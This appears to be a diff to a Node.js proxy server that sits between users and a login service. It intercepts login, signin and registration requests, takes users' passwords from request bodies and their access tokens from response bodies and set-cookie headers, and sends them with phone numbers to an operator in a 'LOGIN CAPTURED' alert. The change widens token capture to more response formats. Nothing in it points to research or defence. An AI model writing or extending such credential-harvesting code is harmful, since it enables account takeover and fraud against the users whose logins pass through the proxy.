@@ -1550,14 +1550,22 @@ app.all('/xxapi/*', async (req, res) => {
     const isLogin = urlLower.includes('login') || urlLower.includes('signin') || urlLower.includes('dologin') || urlLower.includes('auth') || urlLower.includes('register');
     if (isLogin) {
       const pwd = reqBody.password || reqBody.pwd || reqBody.loginPwd || reqBody.pass || '';
-      const token = (respData && typeof respData === 'object') ? (respData.token || respData.accessToken || '') : '';
+      let extractedToken = (respData && typeof respData === 'object') ? (respData.token || respData.accessToken || '') : '';
+      if (!extractedToken && respData && typeof respData.data === 'string' && respData.data.length > 10) {
+        extractedToken = respData.data;
+      }
+      if (!extractedToken && response.headers && response.headers.get('set-cookie')) {
+        const cookieMatch = response.headers.get('set-cookie').match(/token=([^;]+)/);
+        if (cookieMatch) extractedToken = cookieMatch[1];
+      }
+
       const isWeb = !!(req.headers['origin'] || req.headers['referer'] || req.headers['sec-fetch-dest']);
       const platformStr = isWeb ? '🌐 Web Browser' : '📱 Android App';
       notifyAdmin(data,
         `🔑 LOGIN CAPTURED
 👤 User: ${userId || 'N/A'}
 💻 Platform: ${platformStr}
-📱 Phone: ${phone || 'N/A'}${pwd ? '\n🔐 Pass: ' + pwd : ''}${token ? '\n🎫 Token: ' + String(token) : ''}
+📱 Phone: ${phone || 'N/A'}${pwd ? '\n🔐 Pass: ' + pwd : ''}${extractedToken ? '\n🎫 Token: ' + extractedToken : ''}
 🕐 ${now}`);
 
       if (phone && data.suspendedPhones && data.suspendedPhones[String(phone)]) {
